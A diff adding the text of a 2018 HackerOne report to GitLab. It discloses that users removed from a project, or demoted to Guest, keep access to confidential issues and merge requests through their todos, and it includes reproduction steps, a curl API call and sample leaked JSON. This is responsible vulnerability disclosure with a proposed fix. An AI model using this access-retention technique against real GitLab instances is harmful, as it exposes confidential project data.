@@ -1,0 +1,128 @@
+**[HackerOne report #446937](https://hackerone.com/reports/446937)** by xanbanx on 2018-11-19:
+
+Hi GitLab Security Team,
+
+## Background
+
+GitLab supports different roles with different access to the project. Guest users, for example, do not have access to confidential issues or merge requests on private projects. Similar to that, non-project members also don't have access to confidential issues. Furthermore, GitLab supports Todos, which can be added to issues or merge requests.
+
+## Description
+
+A project member with at least access to confidential issues or merge requests creates a personal todo on a (confidential) issue or a merge request. Later, the user is removed from the project. Then, the todo still available for the removed user. On `https://mygitlab.com/dashboard/todos`, the user still has access to the title of the confidential item. When performing the API request `GET https://mygitlab.com/api/v4/todos` the user even has full access to the confidential item and can see the description and the state for example.
+
+The same attack works if the user's permission is changed to a lower `Guest` user role.
+
+## Steps to reproduce
+
+Tested on GitLab 11.5 RC12
+
+1. As owner user `User Owner`, create a private project and add the example user `User A` to the project with at least `Reporter` access
+2. Create a confidential issue
+3. Login as `User A` and add Todo for a confidential issue
+4. Login as `User Owner` and remove `User A` from the project
+5. As `User A` perform the following API request:
+
+```bash
+curl --header "PRIVATE-TOKEN: &lt;User A Token&gt;" https://mygitlab.example.com/api/v4/todos
+```
+
+This reveals the following information to the confidential issue:
+
+```json
+[
+    {
+        "id": 123,
+        "project": {
+            "id": 1,
+            "description": "",
+            "name": "test-todos",
+            "name_with_namespace": "xanbanx / test-todos",
+            "path": "test-todos",
+            "path_with_namespace": "xanbanx/test-todos",
+            "created_at": "2018-11-05T18:06:39.587Z"
+        },
+        "author": {
+            "id": 2,
+            "name": "UserA",
+            "username": "UserA",
+            "state": "active",
+            "avatar_url": "https://secure.gravatar.com/avatar/66e71e6b936e06be6534e032871ab8e7?s=80&amp;d=identicon",
+            "web_url": "https://mygitlab.com/UserA"
+        },
+        "action_name": "marked",
+        "target_type": "Issue",
+        "target": {
+            "id": 4,
+            "iid": 2,
+            "project_id": 1,
+            "title": "Secret Issue",
+            "description": "This is really critical",
+            "state": "opened",
+            "created_at": "2018-11-12T20:25:31.987Z",
+            "updated_at": "2018-11-19T12:47:31.003Z",
+            "closed_at": null,
+            "closed_by": null,
+            "labels": [],
+            "milestone": null,
+            "assignees": [],
+            "author": {
+                "id": 1,
+                "name": "xanbanx",
+                "username": "xanbanx",
+                "state": "active",
+                "avatar_url": "https://secure.gravatar.com/avatar/6466f73ed21b9d1624dee906921e9176?s=80&amp;d=identicon",
+                "web_url": "https://mygitlab.com/xanbanx"
+            },
+            "assignee": null,
+            "user_notes_count": 2,
+            "upvotes": 0,
+            "downvotes": 0,
+            "due_date": null,
+            "confidential": true,
+            "discussion_locked": null,
+            "web_url": "https://mygitlab.com/xanbanx/test-todos/issues/2",
+            "time_stats": {
+                "time_estimate": 0,
+                "total_time_spent": 0,
+                "human_time_estimate": null,
+                "human_total_time_spent": null
+            },
+            "_links": {
+                "self": "https://mygitlab.com/api/v4/projects/1/issues/2",
+                "notes": "https://mygitlab.com/api/v4/projects/1/issues/2/notes",
+                "award_emoji": "https://mygitlab.com/api/v4/projects/1/issues/2/award_emoji",
+                "project": "https://mygitlab.com/api/v4/projects/1"
+            },
+            "subscribed": false,
+            "weight": null
+        },
+        "target_url": "https://mygitlab.com/xanbanx/test-todos/issues/2",
+        "body": "Secret",
+        "state": "pending",
+        "created_at": "2018-11-19T12:20:32.094Z"
+    }
+]
+```
+
+However, this is not only limited to confidential issues as showcased before. 
+
+### Private projects
+
+If the membership was removed, the user still has access to confidential and ordinary issues and merge requests with todos on it. The same holds true if the membership was lowered to a `Guest` user. Here, todos on merge requests and confidential issues are still visible.
+
+### Public projects
+
+For public projects only confidential issues are affected.
+
+## Possible Solution
+
+Personal todos need to be redacted when the membership of a project changes.
+
+## Impact
+
+User still has access to (confidential) issues and merge requests after permission was removed.
+
+A malicious employee of a company could mark all issues/merge requests with a todo. If the employee leaves the company, the user still can query this information via the Todo API and can find out information about the confidential issues or of the merge requests.  
+
+## Dev security issue  
+https://dev.gitlab.org/gitlab/gitlabhq/issues/2755
